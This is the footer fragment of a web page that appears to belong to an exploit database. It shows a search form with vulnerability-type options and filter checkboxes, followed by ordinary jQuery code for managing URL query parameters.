                                    <option value="18" >
                                        Client Side
                                    </option>


                                
                                    <option value="19" >
                                        Use After Free (UAF)
                                    </option>


                                
                                    <option value="20" >
                                        Out Of Bounds
                                    </option>


                                
                                    <option value="21" >
                                        Remote
                                    </option>


                                
                                    <option value="22" >
                                        Local
                                    </option>


                                
                                    <option value="23" >
                                        XML External Entity (XXE)
                                    </option>


                                
                                    <option value="24" >
                                        Integer Overflow
                                    </option>


                                
                                    <option value="25" >
                                        Server-Side Request Forgery (SSRF)
                                    </option>


                                
                                    <option value="26" >
                                        Race Condition
                                    </option>


                                
                                    <option value="27" >
                                        NULL Pointer Dereference
                                    </option>


                                
                                    <option value="28" >
                                        Malware
                                    </option>


                                
                                    <option value="31" >
                                        Buffer Overflow
                                    </option>


                                
                                    <option value="34" >
                                        Heap Overflow
                                    </option>


                                
                                    <option value="35" >
                                        Type Confusion
                                    </option>


                                
                                    <option value="36" >
                                        Object Injection
                                    </option>


                                
                                    <option value="37" >
                                        Bug Report
                                    </option>


                                
                                    <option value="38" >
                                        Console
                                    </option>


                                
                                    <option value="39" >
                                        Pwn2Own
                                    </option>


                                
                                    <option value="40" >
                                        Traversal
                                    </option>


                                
                                    <option value="41" >
                                        Deserialization
                                    </option>


                                
                            </select>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">

                                    <input class="form-check-input" type="checkbox"
                                           name="verified" value="true"
                                           id="verifiedSearchCheck"   >
                                    Verified

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="hasapp" value="true"
                                           id="hasappSearchCheck" >
                                    Has App

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="nomsf" value="true"
                                           id="nomsfCheck" >
                                    No Metasploit

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <button type="submit" class="btn btn-primary float-right">Search</button>

                        </div>

                    </div>

                </form>


            </div>

        </div>

    </div>

</div>

</footer>

    </div>

</div>

</body>

<!--   Make the default DataTables search field larger   -->
<style type="text/css">
    .dataTables_filter input {
        font-size: 16px;
    }
</style>

<!--   Core JS Files   -->
<script src="/js/core/jquery.min.js"></script>
<script src="/js/core/popper.min.js"></script>
<script src="/js/core/bootstrap.min.js"></script>

<script src="/js/plugins/perfect-scrollbar.jquery.min.js"></script>
<script src="/js/plugins/moment.min.js"></script>

<!-- Forms Validations Plugin -->
<script src="/js/plugins/jquery.validate.min.js"></script>

<!--  DataTables.net Plugin, full documentation here:
https://datatables.net/    -->
<script src="/js/plugins/jquery.dataTables.min.js"></script>

<!--  Notifications Plugin    -->
<script src="/js/plugins/bootstrap-notify.js"></script>

<!-- Control Center for Now Ui Dashboard: parallax effects,
scripts for the example pages etc -->
<script src="/js/now-ui-dashboard.js"></script>

<script src="/js/selectize.min.js"></script>

<script src="/js/app.js"></script>
<script src="/js/appfunctions.js"></script>


<script>
    window.addEventListener('popstate', () => {
        location.reload();
    }, false);

    $(function () {
        $('[data-toggle="tooltip"]').tooltip()
    })

    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }


    function removeURLParameter(url, parameter) {
        //prefer to use l.search if you have a location/link object
        var urlparts= url.split('?');
        if (urlparts.length>=2) {

            var prefix= encodeURIComponent(parameter)+'=';
            var pars= urlparts[1].split(/[&;]/g);

            //reverse iteration as may be destructive
            for (var i= pars.length; i-- > 0;) {
                //idiom for string.startsWith
                if (pars[i].lastIndexOf(prefix, 0) !== -1) {
                    pars.splice(i, 1);
                }
            }

            url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");
            window.history.pushState('', document.title, url);
            return url;
        } else {
            window.history.pushState('', document.title, url);
            return url;
        }
    }

    function showFilters() {
        var x = document.getElementById("exploitFiltersCard");
        if (x.style.display === "none") {
            x.style.display = "block";
        } else {
            x.style.display = "none";
        }
    }

    function updateQueryString(key, value, url) {
        if (!url) url = window.location.href;
        var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),
            hash;

        if (re.test(url)) {
            if (typeof value !== 'undefined' && value !== null)
                return url.replace(re, '$1' + key + "=" + value + '$2$3');
            else {
                hash = url.split('#');
                url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
        }
        else {
            if (typeof value !== 'undefined' && value !== null) {
                var separator = url.indexOf('?') !== -1 ? '&' : '?';
                hash = url.split('#');
                url = hash[0] + separator + key + '=' + value;
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
            else
                window.history.pushState('', document.title, url);
                return url;
        }
    }

    $('#search').submit(function() {
        $(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");
        return true; // ensure form still submits
    });

    // Un-disable form fields when page loads, in case they click back after submission
    $('#search').find( ":input" ).prop( "disabled", false );

    // If the ajax call fails, throw the error to the console instead of
    // popping up an alert to the user
    $.fn.dataTable.ext.errMode = 'throw';

</script>

<!-- App scripts -->



</html>
